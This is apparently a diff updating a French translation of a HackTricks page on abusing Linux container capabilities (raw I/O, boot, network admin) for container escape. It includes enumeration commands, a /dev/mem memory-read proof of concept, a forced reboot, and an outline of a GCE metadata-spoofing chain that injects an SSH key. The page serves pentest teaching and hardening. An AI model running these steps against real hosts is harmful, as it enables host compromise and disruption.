-Il n’existe pas de payload générique portable : les adresses et les effets valides dépendent du matériel et de la configuration du kernel.
+### `CAP_SYS_RAWIO` : interface d’E/S brute exposée
 
-**Vérifiez la capability et la portée du user namespace :**
+Il n’existe pas de charge utile générique portable : les adresses valides et les effets dépendent du matériel et de la configuration du noyau.
+
+**Vérifier la capacité et la portée du user namespace :**
+
 ```bash
 capsh --print | grep cap_sys_rawio
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Énumérer les interfaces brutes, le matériel et les pilotes exposés :**
+
+**Énumérer les interfaces brutes exposées, le matériel et les pilotes :**
+
 ```bash
 ls -l /dev/mem /dev/port 2>/dev/null
 lspci -nnk 2>/dev/null
 find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
 ```
-**Exploit uniquement avec une preuve approuvée pour le périphérique et la plage d’adresses identifiés.** Si `/dev/mem` est l’interface approuvée par le laboratoire, ce modèle prouve la divulgation de la mémoire du nœud sans en afficher le contenu :
+
+**N’exploitez qu’avec une preuve de concept approuvée pour le périphérique identifié et la plage d’adresses correspondante.** Si `/dev/mem` est l’interface approuvée pour le laboratoire, ce modèle démontre la divulgation de la mémoire du nœud sans en afficher le contenu :
+
 ```bash
 approved_physical_address=<lab-provided-decimal-address>
 approved_byte_count=<lab-provided-size>
 dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
-skip="${approved_physical_address}" count="${approved_byte_count}" status=none
+  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
 wc -c /tmp/ht-rawio-proof.bin
 sha256sum /tmp/ht-rawio-proof.bin
 rm /tmp/ht-rawio-proof.bin
 ```
-L’adresse doit provenir de la carte matérielle du lab, car la lecture de certaines régions MMIO peut avoir des effets secondaires. Une commande générique d’écriture mémoire serait trompeuse et dangereuse : la même adresse peut être inoffensive sur une machine et contrôler du matériel ou la mémoire du kernel sur une autre. Les device cgroups, les permissions du filesystem, les restrictions strictes de `/dev/mem`, le kernel lockdown, la virtualisation et les règles LSM empêchent généralement tout accès utile.
 
-### `CAP_SYS_BOOT` : reboot du namespace ou remplacement du kernel
+L’adresse doit provenir de la cartographie matérielle du lab, car la lecture de certaines régions MMIO peut avoir des effets secondaires. Une commande générique d’écriture mémoire serait trompeuse et dangereuse : une même adresse peut être inoffensive sur une machine et contrôler le matériel ou la mémoire du kernel sur une autre. Les device cgroups, les permissions du système de fichiers, les restrictions strictes de `/dev/mem`, le kernel lockdown, la virtualisation et les politiques LSM empêchent souvent tout accès utile.
 
-Dans un namespace PID privé, `reboot()` termine le processus init de ce namespace au lieu de redémarrer l’hôte. Un impact sur le reboot de l’hôte nécessite donc le namespace PID initial, normalement via le partage des PID de l’hôte. Une voie kexec nécessite également une image de kernel compatible ainsi qu’une politique permissive concernant le lockdown et les signatures :
+### `CAP_SYS_BOOT` : redémarrage d’un espace de noms ou remplacement du kernel
+
+Dans un espace de noms PID privé, `reboot()` termine le processus init de cet espace de noms au lieu de redémarrer l’hôte. Un redémarrage de l’hôte nécessite donc l’espace de noms PID initial, généralement via le partage du PID de l’hôte. Un chemin kexec nécessite également une image kernel compatible et une politique lockdown/signature permissive :
 
 **Vérifier la capability :**
+
 ```bash
 capsh --print | grep cap_sys_boot
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Énumérez les prérequis de PID namespace et de kexec : confirmez le partage des PID de l’hôte à partir de la configuration de la workload, car un simple lien vers un PID namespace ne révèle pas s’il s’agit du namespace initial du nœud.**
+
+**Énumérez les prérequis de l’espace de noms PID et de kexec :** confirmez le partage des PID de l’hôte à partir de la configuration de la charge de travail, car un lien vers un espace de noms PID ne permet pas à lui seul de savoir s’il s’agit de l’espace de noms initial du nœud.
+
 ```bash
 ps -p 1 -o pid,user,comm,args
 readlink /proc/self/ns/pid
 command -v kexec 2>/dev/null
 cat /sys/kernel/security/lockdown 2>/dev/null
 ```
-**Exploit uniquement lorsque le redémarrage d’un nœud de laboratoire jetable constitue explicitement l’exercice :**
+
+**Exploiter uniquement lorsque le redémarrage d’un nœud de laboratoire jetable constitue explicitement l’exercice :**
+
 ```bash
 sync
 reboot -f
 ```
-N’exécutez pas cette commande et ne chargez pas de kernel sur un nœud partagé simplement pour prouver la capability. Dans un PID namespace privé, cela termine uniquement le processus init de ce namespace et ne démontre aucun impact sur l’hôte.
+
+N’exécutez pas cette commande et ne chargez pas de noyau sur un nœud partagé dans le seul but de prouver la capacité. Dans un espace de noms PID privé, cela ne met fin qu’au processus init de cet espace de noms et ne démontre pas d’impact sur l’hôte.
 
 ### `CAP_NET_ADMIN` et `CAP_NET_RAW` : chemins réseau de l’hôte
 
-`CAP_NET_ADMIN` affecte uniquement le network namespace actuel.
+`CAP_NET_ADMIN` n’affecte que l’espace de noms réseau actuel.
 
-**Vérifiez les capabilities et le confinement :**
+**Vérifiez les capacités et le confinement :**
+
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 ```
-**Énumérez le réseau actuel et confirmez la mise en réseau de l’hôte à partir de la configuration de la charge de travail :**
+
+**Recensez le réseau actuel et confirmez l’utilisation du réseau de l’hôte dans la configuration de la charge de travail :**
+
 ```bash
 readlink /proc/self/ns/net
 ip -brief address
 ip route
 nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
 ```
-**Exercer `CAP_NET_ADMIN` de manière réversible :** avec le host networking, l’interface temporaire est une interface du nœud.
+
+**Exercer `CAP_NET_ADMIN` de manière réversible : avec le réseau de l’hôte, l’interface temporaire est une interface du nœud.**
+
 ```bash
 ip link add ht-net-admin-proof type dummy
 ip addr add 192.0.2.1/32 dev ht-net-admin-proof
@@ -319,45 +380,59 @@ ip link set ht-net-admin-proof up
 ip -brief addr show ht-net-admin-proof
 ip link delete ht-net-admin-proof
 ```
-`CAP_NET_RAW` autorise les sockets RAW et PACKET, mais ne constitue pas un shell hôte générique. Pour **énumérer** la chaîne GCE documentée, vérifiez la route vers les metadata et observez si le trafic en clair de `guest-agent` est visible :
+
+`CAP_NET_RAW` permet les sockets RAW et PACKET, mais ne fournit pas un shell hôte générique. Pour **recenser** la chaîne GCE documentée, vérifiez la route des métadonnées et capturez le trafic afin de déterminer si le trafic en clair de l’agent invité est observable :
+
 ```bash
 ip route get 169.254.169.254
 tcpdump -ni any -c 20 'host 169.254.169.254'
 ```
-Si les prérequis correspondants sont réunis, **exploit** la chaîne spécifique à l’environnement telle qu’elle est documentée dans [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) : capturez l’état de la requête et de la séquence, injectez la réponse de métadonnées falsifiée contenant une clé SSH, puis validez l’accès à l’hôte. La chaîne nécessitait root, le host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, du trafic de métadonnées GCE en clair et une requête de guest-agent exploitable dans une race condition ; un transport ou un comportement d’agent moderne peut la rendre impossible.
+
+Si les prérequis correspondants sont réunis, **exploit** la chaîne spécifique à l’environnement décrite dans [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) : capture la requête et l’état de séquence, injecte la réponse forgée des métadonnées contenant une clé SSH, puis vérifie l’accès à l’hôte. Cette chaîne nécessitait les privilèges root, le réseau de l’hôte, `CAP_NET_ADMIN`, `CAP_NET_RAW`, du trafic en clair vers les métadonnées GCE et une requête de l’agent invité exposée à une condition de course ; les comportements modernes du transport ou de l’agent peuvent la faire échouer.
+
+### Restrictions d’origine locale et adresses d’interface
+
+Un service en écoute peut rejeter les connexions dont la source est `127.0.0.1`, tout en négligeant une autre adresse attribuée au même espace de noms réseau. Si le service est accessible via cette interface, compare une connexion via loopback à une connexion liée à une adresse locale existante autre que loopback. `CAP_NET_ADMIN` peut permettre de configurer une interface dans l’espace de noms actuel, mais n’est pas nécessaire si une adresse appropriée y est déjà attribuée. `CAP_NET_RAW` n’est pas nécessaire pour une connexion TCP ordinaire. Il s’agit d’un défaut de classification de l’adresse source, et non d’une évasion de conteneur ou d’une preuve que l’application autorisera une requête privilégiée.<sup>[[1]](#references)[[7]](#references)</sup>
+
+Pour un service WebSocket en écoute, une réponse HTTP `101 Switching Protocols` valide confirme que la négociation initiale a abouti ; une erreur ultérieure au niveau applicatif peut indiquer que la connexion a atteint le gestionnaire. Aucune de ces réponses ne prouve que l’authentification ou l’opération demandée a réussi.<sup>[[8]](#references)</sup>
 
 ## Vérifications
 
-L’objectif des vérifications des capabilities n’est pas seulement d’extraire des valeurs brutes, mais de comprendre si le processus dispose de suffisamment de privilèges pour rendre dangereuses sa namespace actuelle et sa situation de montage.
+L’objectif des vérifications des capabilities n’est pas seulement d’afficher les valeurs brutes, mais aussi de comprendre si le processus dispose de privilèges suffisants pour rendre dangereuses sa configuration actuelle des espaces de noms et des montages.
+
 ```bash
 capsh --print                    # Human-readable capability sets and securebits
 grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
 ```
+
 Ce qui est intéressant ici :
 
-- `capsh --print` est le moyen le plus simple d'identifier les capabilities à haut risque telles que `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
-- La ligne `CapEff` dans `/proc/self/status` vous indique ce qui est effectivement actif actuellement, et pas seulement ce qui pourrait être disponible dans d'autres ensembles.
-- Un dump des capabilities devient beaucoup plus important si le container partage également les namespaces PID, réseau ou utilisateur de l'hôte, ou dispose de mounts hôte accessibles en écriture.
+- `capsh --print` est le moyen le plus simple de repérer les capacités à haut risque, telles que `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
+- La ligne `CapEff` dans `/proc/self/status` indique les capacités actuellement effectives, et pas seulement celles qui pourraient être disponibles dans d’autres ensembles.
+- Un dump des capacités devient beaucoup plus important si le conteneur partage également les espaces de noms PID, réseau ou utilisateur de l’hôte, ou s’il dispose de montages hôte accessibles en écriture.
 
-Après avoir collecté les informations brutes sur les capabilities, l'étape suivante consiste à les interpréter. Demandez-vous si le processus est root, si les user namespaces sont actifs, si les namespaces de l'hôte sont partagés, si seccomp est appliqué et si AppArmor ou SELinux restreint encore le processus. Un ensemble de capabilities ne constitue qu'une partie du tableau, mais c'est souvent cette partie qui explique pourquoi un container breakout fonctionne alors qu'un autre échoue avec le même point de départ apparent.
+Après avoir collecté les informations brutes sur les capacités, l’étape suivante consiste à les interpréter. Vérifiez si le processus s’exécute en tant que root, si les espaces de noms utilisateur sont actifs, si des espaces de noms de l’hôte sont partagés, si seccomp est appliqué et si AppArmor ou SELinux restreint toujours le processus. Un ensemble de capacités ne représente qu’une partie de la situation, mais c’est souvent lui qui explique pourquoi un container breakout fonctionne alors qu’un autre échoue avec le même point de départ apparent.
 
-## Runtime Defaults
+## Paramètres par défaut des runtimes
 
-| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
+| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel fréquent |
 | --- | --- | --- | --- |
-| Docker Engine | Ensemble de capabilities réduit par défaut | Docker conserve une allowlist par défaut de capabilities et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
-| Podman | Ensemble de capabilities réduit par défaut | Les containers Podman sont unprivileged par défaut et utilisent un modèle de capabilities réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
-| Kubernetes | Hérite des valeurs par défaut du runtime sauf modification | Si aucune `securityContext.capabilities` n'est spécifiée, le container reçoit l'ensemble de capabilities par défaut du runtime | `securityContext.capabilities.add`, absence de `drop: [\"ALL\"]`, `privileged: true` |
-| containerd / CRI-O sous Kubernetes | Généralement les valeurs par défaut du runtime | L'ensemble effectif dépend du runtime et de la spécification du Pod | identique à la ligne Kubernetes ; la configuration OCI/CRI directe peut également ajouter explicitement des capabilities |
+| Docker Engine | Ensemble réduit de capacités par défaut | Docker conserve une liste d’autorisation par défaut des capacités et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
+| Podman | Ensemble réduit de capacités par défaut | Les conteneurs Podman sont non privilégiés par défaut et utilisent un modèle de capacités réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
+| Kubernetes | Hérite des paramètres par défaut du runtime, sauf modification | Si aucun `securityContext.capabilities` n’est spécifié, le conteneur reçoit l’ensemble de capacités par défaut du runtime | `securityContext.capabilities.add`, ne pas définir `drop: [\"ALL\"]`, `privileged: true` |
+| containerd / CRI-O sous Kubernetes | Généralement les paramètres par défaut du runtime | L’ensemble effectif dépend du runtime et de la spécification du Pod | Identique à la ligne Kubernetes ; la configuration OCI/CRI directe peut également ajouter explicitement des capacités |
 
-Pour Kubernetes, le point important est que l'API ne définit pas un ensemble universel de capabilities par défaut. Si le Pod n'ajoute ni ne supprime de capabilities, le workload hérite des valeurs par défaut du runtime pour ce node.
+Pour Kubernetes, le point important est que l’API ne définit pas un ensemble universel de capacités par défaut. Si le Pod n’ajoute ni ne supprime de capacités, la charge de travail hérite des paramètres par défaut du runtime de ce nœud.
+
+{{#include ../../../../banners/hacktricks-training.md}}
 
 ## References
 
 - [1] [capabilities(7) - page du manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [2] [Open Container Initiative - configuration des containers Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
-- [3] [Docker Docs - privilèges du runtime et capabilities Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
-- [4] [Kubernetes Documentation - définir les capabilities d'un container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
+- [2] [Open Container Initiative - configuration des conteneurs Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
+- [3] [Docker Docs - privilèges d’exécution et capacités Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
+- [4] [Documentation Kubernetes - définir les capacités d’un conteneur](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
 - [5] [Documentation Podman - `--cap-add` et `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
 - [6] [Documentation Incus - sécurité](https://linuxcontainers.org/incus/docs/main/explanation/security/)
-{{#include ../../../../banners/hacktricks-training.md}}
+- [7] [ip(7) - implémentation du protocole IPv4 sous Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
+- [8] [RFC 6455 - le protocole WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
